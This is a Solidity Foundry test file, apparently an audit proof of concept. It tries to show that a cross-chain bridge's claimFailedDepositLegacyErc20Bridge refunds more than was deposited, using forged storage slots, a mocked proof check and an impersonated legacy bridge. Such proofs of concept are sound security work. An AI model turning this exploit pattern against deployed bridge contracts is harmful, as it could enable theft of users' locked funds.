// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";

import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {L1SharedBridge} from "solpp/bridge/L1SharedBridge.sol";
import {Bridgehub} from "solpp/bridgehub/Bridgehub.sol";
import {L1ERC20Bridge} from "solpp/bridge/L1ERC20Bridge.sol";
import {ETH_TOKEN_ADDRESS} from "solpp/common/Config.sol";
import {IBridgehub, L2TransactionRequestTwoBridgesInner} from "solpp/bridgehub/IBridgehub.sol";
import {L2Message, TxStatus} from "solpp/common/Messaging.sol";
import {IMailbox} from "solpp/state-transition/chain-interfaces/IMailbox.sol";
import {IL1ERC20Bridge} from "solpp/bridge/interfaces/IL1ERC20Bridge.sol";
import {IL1SharedBridge} from "solpp/bridge/interfaces/IL1SharedBridge.sol";
import {TestnetERC20Token} from "solpp/dev-contracts/TestnetERC20Token.sol";
import {L2_BASE_TOKEN_SYSTEM_CONTRACT_ADDR} from "solpp/common/L2ContractAddresses.sol";
import {ERA_CHAIN_ID} from "solpp/common/Config.sol";

contract TestExcessiveRefund is Test {
    uint256 depositAmount = 100 ether; // 初始存款金额
    uint256 refundAmount = 200 ether; // 尝试的退款金额
   
    L1SharedBridge sharedBridgeImpl;
    L1SharedBridge sharedBridge;
    address bridgehubAddress;
    address l1ERC20BridgeAddress;
    address l2SharedBridge;
    TestnetERC20Token token;

    address owner;
    address admin;
    address zkSync;
    address alice;
    address attacker;
    uint256 chainId;
    uint256 amount = 100;
    bytes32 txHash;

    uint256 l2BatchNumber;
    uint256 l2MessageIndex;
    uint16 l2TxNumberInBatch;
    bytes32[] merkleProof;

    uint256 eraFirstPostUpgradeBatch;

    function setUp() public {
        attacker = makeAddr("attacker");
        owner = makeAddr("owner");
        admin = makeAddr("admin");
        // zkSync = makeAddr("zkSync");
        bridgehubAddress = makeAddr("bridgehub");
        alice = makeAddr("alice");
        // bob = makeAddr("bob");
        address l1WethAddress = makeAddr("weth");
        l1ERC20BridgeAddress = makeAddr("l1ERC20Bridge");
        l2SharedBridge = makeAddr("l2SharedBridge");

        txHash = bytes32(uint256(uint160(makeAddr("txHash"))));
        //l2BatchNumber = uint256(uint160(makeAddr("l2BatchNumber")));
        l2BatchNumber = 50;
        eraFirstPostUpgradeBatch = 100;

        l2MessageIndex = uint256(uint160(makeAddr("l2MessageIndex")));
        l2TxNumberInBatch = uint16(uint160(makeAddr("l2TxNumberInBatch")));
        merkleProof = new bytes32[](1);

        chainId = 1;

        token = new TestnetERC20Token("TestnetERC20Token", "TET", 18);
        sharedBridgeImpl = new L1SharedBridge(
            l1WethAddress,
            IBridgehub(bridgehubAddress),
            IL1ERC20Bridge(l1ERC20BridgeAddress)
        );
        TransparentUpgradeableProxy sharedBridgeProxy = new TransparentUpgradeableProxy(
            address(sharedBridgeImpl),
            admin,
            abi.encodeWithSelector(L1SharedBridge.initialize.selector, owner, eraFirstPostUpgradeBatch)
        );
        sharedBridge = L1SharedBridge(payable(sharedBridgeProxy));
        vm.prank(owner);
        sharedBridge.initializeChainGovernance(chainId, l2SharedBridge);
        vm.prank(owner);
        sharedBridge.initializeChainGovernance(ERA_CHAIN_ID, l2SharedBridge);
    }

    function test_excessiveRefundAttack() public {
        // mint 100 for shareBridge，50 from alice, 50 from others
        token.mint(address(sharedBridge), amount);

        // storing depoistHappend[chainId][l2TxHash] = txDataHash. DepositHappened is 3rd so 3 -1 + dependency storage slots
        uint256 depositLocationInStorage = uint256(3 - 1 + 1 + 1);
        uint256 amountAlice = 50;
        uint256 amountAliceExcessive = 55;
        bytes32 txDataHash = keccak256(abi.encode(alice, address(token), amountAlice));
        vm.store(
            address(sharedBridge),
            keccak256(abi.encode(txHash, keccak256(abi.encode(ERA_CHAIN_ID, depositLocationInStorage)))),
            txDataHash
        );
        require(sharedBridge.depositHappened(ERA_CHAIN_ID, txHash) == txDataHash, "Deposit not set");
        
        uint256 chainBalanceLocationInStorage = uint256(6 - 1 + 1 + 1);
        vm.store(
            address(sharedBridge),
            keccak256(
                abi.encode(
                    uint256(uint160(address(token))),
                    keccak256(abi.encode(ERA_CHAIN_ID, chainBalanceLocationInStorage))
                )
            ),
            bytes32(amount)
        );

        // Bridgehub bridgehub = new Bridgehub();
        // vm.store(address(bridgehub),  bytes32(uint256(5 +2)), bytes32(uint256(31337)));
        // require(address(bridgehub.deployer()) == address(31337), "Bridgehub: deployer wrong");
        
        vm.mockCall(
            bridgehubAddress,
            abi.encodeWithSelector(
                IBridgehub.proveL1ToL2TransactionStatus.selector,
                ERA_CHAIN_ID,
                txHash,
                l2BatchNumber,
                l2MessageIndex,
                l2TxNumberInBatch,
                merkleProof,
                TxStatus.Failure
            ),
            abi.encode(true)
        );
        console2.log("Alice Before Refound: ", token.balanceOf(alice));

        vm.prank(l1ERC20BridgeAddress);
        sharedBridge.claimFailedDepositLegacyErc20Bridge(
            alice,
            address(token),
            amountAliceExcessive,
            txHash,
            l2BatchNumber,
            l2MessageIndex,
            l2TxNumberInBatch,
            merkleProof
        );
        console2.log("Alice Excessive Refound: ", token.balanceOf(alice));
    }
    
}
